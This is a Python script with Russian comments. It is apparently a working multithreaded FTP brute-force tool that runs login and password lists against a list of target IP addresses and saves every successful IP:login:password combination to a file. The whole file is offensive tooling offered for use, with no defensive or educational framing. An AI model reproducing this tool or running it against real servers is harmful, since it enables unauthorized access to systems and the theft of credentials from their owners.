#!/usr/bin/python
# -*- coding: utf-8 -*-


#Модули
import ftplib;
import argparse;
import os;
import datetime;
import threading;
import queue;

#Функция скана каждый поток ее использует
def Scan(i, IP, FOutputFileName, Lock, LoginList, PasswordList):
	#Бсконечный цикл
	while True:
		#Пустой список с адресами логинами и паролями
		Adress = [];
		#Флаг прекращения перебора по логинам
		FLAG = False;
		#Берем из очереди строку (те диапазон айпишников)
		Ad = IP.get();
		#Получаем текущюю дату и время
		DateTime = str(datetime.datetime.now());
		#Выод того ип шо брутим +длинна списка
		print ("\x1b[37m %s - Thread %i Brute %s - %i \x1b[0m" % (DateTime, i, Ad[:-1], IP.qsize()));
		#Цикл по логинам
		for Login in LoginList:
			#Если флаг тру, то обрываем цикл
			if (FLAG == True):
				break;
			#Цикл по паролям, он вложенный
			for Password in PasswordList:
				#Обработка исключений
				try:
					#Конектимся к серву
					con = ftplib.FTP(Ad, Login, Password, 2);
					#Опять получпем дату и время
					DateTime = str(datetime.datetime.now());
					#Выводим то что подконектились
					print ("\x1b[32m %s - Thread %i IP %s Login and Pass FOUND !!! %s:%s \x1b[0m" % (DateTime, i, Ad[:-1], Login, Password));
					#Закрывам соединение
					con.close;
					#Добовляем ип и логин и пароль в список
					Adress.append(Ad[:-1] +":"+ Login +":"+ Password);
					#Выставляем флаг, который обрывает внешний цикл (по логинам)
					FLAG = True;
					#Обрываем внутренний цикл (по паролям)
					break;
				#Если логин и пароль не подошел то
				except ftplib.error_perm:
						#Ничего не предпринимаем
						pass;
				#Если хост не работает, ну вырубил его
				except OSError:
						#Опять получпем дату и время
						DateTime = str(datetime.datetime.now());
						#Выводим их
						print ("\x1b[31m %s - Thread %i IP %s No route \x1b[0m" % (DateTime, i, Ad[:-1]));
						#Ставим флаг
						FLAG = True;
						#Обрываем цикл
						break;

		#Захватить блокировку
		Lock.acquire(1);
		#Открываем файл
		OutputFile = open(FOutputFileName, 'a');
		#Цикл по списку айпишников
		for ad in Adress:
			#Записывем айпишники в файл
			OutputFile.write(ad + "\n");
			#Закрываем файл
		OutputFile.close();
		#Отпустить блокировку
		Lock.release();
		#Ждем завершения
		IP.task_done();

def Main():
	#Создаем очередь
	IPList = queue.Queue();
	#Создаем парсер
	parse = argparse.ArgumentParser(description='Брут для ФТП серваков на логин пасс')
	#Добавляем опцию, путь к файлу паролей
	parse.add_argument('-f', action='store', dest='IP', help='Путь к файлу с айпишниками, пример: \'IP.txt\'');
	parse.add_argument('-t', action='store', dest='Thread', help='Количество потоков');
	parse.add_argument('-l', action='store', dest='LoginsFile', help='Файл логинов');
	parse.add_argument('-p', action='store', dest='PasswordsFile', help='Файл паролей');
	parse.add_argument('-o', action='store', dest='OutputFile', help='Выходной файл');
	#Получаем аргументы
	args = parse.parse_args();
	#Если аргументов нет то
	if (args.IP == None) or (args.Thread == None) or (args.LoginsFile == None) or (args.PasswordsFile == None) or (args.OutputFile == None):
		#Выводим хэлп
		print (parse.print_help());
		#Выход
		exit();
	#Иначе, если аргументы есть то
	else:
		#Проверка на существование файлов
		if (os.path.exists(args.IP) != True):
			print ("\x1b[31m" +str(datetime.datetime.now()) + " - IP List file no found\x1b[0m");
			exit();
		if (os.path.exists(args.LoginsFile) != True):
			print ("\x1b[31m" +str(datetime.datetime.now()) + " - Login file no found\x1b[0m");
			exit();
		if (os.path.exists(args.PasswordsFile) != True):
			print ("\x1b[31m" +str(datetime.datetime.now()) + " - Password file no found\x1b[0m");
			exit();
		if (os.path.exists(args.OutputFile) != True):
			print ("\x1b[31m" +str(datetime.datetime.now()) + " - Output file no found\x1b[0m");
			exit();
		#Пишем что скан запущен
		print ("\x1b[34m" +str(datetime.datetime.now()) + " - Scan Starting...\x1b[0m");

		#Считываем логины в список
		LoginFile = open(args.LoginsFile, 'r');
		LoginList = [line.strip() for line in LoginFile];

		#Считываем пароли в список
		PasswordFile = open(args.PasswordsFile, 'r');
		PasswordList = [line.strip() for line in PasswordFile];
		
		#Считываем айпишники в список
		IpFile = open(args.IP, 'r');
		for line in IpFile.readlines():
			#Добовляем в очередь ип из списка 
			IPList.put(line);

		#Блокировка
		screenLock = threading.Lock();
		
		#Создаем потоки
		for i in range(int(args.Thread)):
			worker = threading.Thread(target=Scan, args=(i, IPList, args.OutputFile, screenLock, LoginList, PasswordList));
			worker.setDaemon(True);
			worker.start();

		IPList.join();
		#Конец скана
		print ("\x1b[34m" + str(datetime.datetime.now()) + " - Scan Done\x1b[0m");


if __name__=="__main__":
	Main();
